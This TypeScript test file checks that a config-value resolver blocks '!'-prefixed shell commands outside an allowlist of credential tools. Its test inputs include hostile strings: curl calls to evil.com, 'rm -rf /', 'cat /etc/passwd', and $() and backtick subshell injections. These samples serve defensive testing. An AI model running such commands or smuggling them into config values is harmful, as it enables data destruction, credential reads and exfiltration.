import { describe, it, beforeEach } from "node:test";
import assert from "node:assert/strict";
import {
	resolveConfigValue,
	clearConfigValueCache,
	SAFE_COMMAND_PREFIXES,
} from "./resolve-config-value.js";

beforeEach(() => {
	clearConfigValueCache();
});

describe("SAFE_COMMAND_PREFIXES", () => {
	it("exports the allowlist array", () => {
		assert.ok(Array.isArray(SAFE_COMMAND_PREFIXES));
		assert.ok(SAFE_COMMAND_PREFIXES.length > 0);
	});

	it("includes expected credential tools", () => {
		assert.ok(SAFE_COMMAND_PREFIXES.includes("pass"));
		assert.ok(SAFE_COMMAND_PREFIXES.includes("op"));
		assert.ok(SAFE_COMMAND_PREFIXES.includes("aws"));
	});
});

describe("resolveConfigValue — non-command values", () => {
	it("returns the literal value when it does not match an env var", () => {
		const result = resolveConfigValue("my-literal-key");
		assert.equal(result, "my-literal-key");
	});

	it("returns the env var value when the config matches an env var name", () => {
		process.env["TEST_RESOLVE_CONFIG_VAR"] = "env-value";
		const result = resolveConfigValue("TEST_RESOLVE_CONFIG_VAR");
		assert.equal(result, "env-value");
		delete process.env["TEST_RESOLVE_CONFIG_VAR"];
	});
});

describe("resolveConfigValue — command allowlist enforcement", () => {
	it("blocks a disallowed command and returns undefined", (t) => {
		const stderrChunks: string[] = [];
		const originalWrite = process.stderr.write.bind(process.stderr);
		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
			stderrChunks.push(chunk.toString());
			return true;
		};
		t.after(() => {
			process.stderr.write = originalWrite;
		});

		const result = resolveConfigValue("!curl http://evil.com");
		assert.equal(result, undefined);
		assert.ok(stderrChunks.some((line) => line.includes("curl")));
	});

	it("blocks another disallowed command (rm)", () => {
		const result = resolveConfigValue("!rm -rf /tmp/test");
		assert.equal(result, undefined);
	});

	it("blocks a disallowed command with no arguments", () => {
		const result = resolveConfigValue("!wget");
		assert.equal(result, undefined);
	});

	it("allows a safe command prefix to proceed to execution", (t) => {
		// `pass` is unlikely to be installed in CI, so we just verify it does NOT
		// return undefined due to the allowlist check — it may return undefined if
		// the binary is absent, but the block path must not be taken.
		// We confirm by checking no "Blocked" message appears on stderr.
		const stderrChunks: string[] = [];
		const originalWrite = process.stderr.write.bind(process.stderr);
		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
			stderrChunks.push(chunk.toString());
			return true;
		};
		t.after(() => {
			process.stderr.write = originalWrite;
		});

		resolveConfigValue("!pass show nonexistent-entry-for-test");
		const blocked = stderrChunks.some((line) =>
			line.includes("Blocked disallowed command")
		);
		assert.equal(blocked, false, "pass should not be blocked by the allowlist");
	});
});

describe("resolveConfigValue — shell operator bypass prevention", () => {
	it("blocks semicolon chaining (pass; malicious)", () => {
		const result = resolveConfigValue("!pass show key; curl http://evil.com");
		assert.equal(result, undefined);
	});

	it("blocks pipe operator (pass | evil)", () => {
		const result = resolveConfigValue("!pass show key | cat /etc/passwd");
		assert.equal(result, undefined);
	});

	it("blocks && chaining (pass && evil)", () => {
		const result = resolveConfigValue("!pass show key && rm -rf /");
		assert.equal(result, undefined);
	});

	it("blocks || chaining (pass || evil)", () => {
		const result = resolveConfigValue("!pass show key || curl evil.com");
		assert.equal(result, undefined);
	});

	it("blocks backtick subshell (pass `evil`)", () => {
		const result = resolveConfigValue("!pass show `curl evil.com`");
		assert.equal(result, undefined);
	});

	it("blocks $() subshell (pass $(evil))", () => {
		const result = resolveConfigValue("!pass show $(curl evil.com)");
		assert.equal(result, undefined);
	});

	it("blocks output redirection (pass > file)", () => {
		const result = resolveConfigValue("!pass show key > /tmp/stolen");
		assert.equal(result, undefined);
	});

	it("blocks input redirection (pass < file)", () => {
		const result = resolveConfigValue("!pass show key < /dev/null");
		assert.equal(result, undefined);
	});

	it("writes stderr warning when shell operators detected", (t) => {
		const stderrChunks: string[] = [];
		const originalWrite = process.stderr.write.bind(process.stderr);
		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
			stderrChunks.push(chunk.toString());
			return true;
		};
		t.after(() => {
			process.stderr.write = originalWrite;
		});

		resolveConfigValue("!pass show key; curl evil.com");
		assert.ok(stderrChunks.some((line) => line.includes("shell operators")));
	});
});

describe("resolveConfigValue — caching", () => {
	it("caches the result of a blocked command", (t) => {
		const callCount = { n: 0 };
		const originalWrite = process.stderr.write.bind(process.stderr);
		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
			callCount.n++;
			return true;
		};
		t.after(() => {
			process.stderr.write = originalWrite;
		});

		resolveConfigValue("!curl http://evil.com");
		resolveConfigValue("!curl http://evil.com");
		// The block warning should only fire once; the second call hits the cache
		// before reaching the allowlist check, so stderr count is 1.
		assert.equal(callCount.n, 1);
	});

	it("clearConfigValueCache resets cached entries", (t) => {
		const stderrChunks: string[] = [];
		const originalWrite = process.stderr.write.bind(process.stderr);
		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
			stderrChunks.push(chunk.toString());
			return true;
		};
		t.after(() => {
			process.stderr.write = originalWrite;
		});

		resolveConfigValue("!curl http://evil.com");
		assert.equal(stderrChunks.length, 1);

		clearConfigValueCache();

		resolveConfigValue("!curl http://evil.com");
		assert.equal(stderrChunks.length, 2);
	});
});
